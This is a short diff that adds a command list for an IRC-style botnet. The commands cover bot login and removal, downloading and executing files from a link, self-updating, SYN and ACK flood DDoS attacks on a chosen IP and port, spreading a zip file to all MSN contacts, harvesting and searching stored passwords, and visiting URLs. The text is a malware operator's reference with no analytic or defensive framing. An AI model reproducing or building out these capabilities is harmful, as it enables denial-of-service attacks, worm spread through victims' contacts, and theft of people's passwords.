@@ -1,0 +1,31 @@
+## main commands
+
+.login					' login into the bot
+.logout					' logout of the bot
+
+.remove					' removes the bot
+
+## download, update commands
+
+.get.download <link> <savepath> <1,0>	' download a file (1 = excute file; 0 = do nothing)
+.get.update				' update the server
+
+## ddos commands
+
+.ddos.syn <ip> <port> <time>		' syn attack
+.ddos.ack <ip> <port> <time>		' ack attack
+.ddos.random				' random attack
+
+## msn commands
+
+.msn.spread <exe> <zip> (Msg)		' spreads the .zip over all contacts (and message if supplyed else random used)
+.msn.stats				' shows stats of msn commands
+.msn.msg <message>			' sends message to all contacts
+
+##  Pstore
+.pstore					' gets stored passwords
+.pstore.search				' search for a string in stored passwords
+
+## Visit Link
+
+.visit <url>				' visits the url supplyed
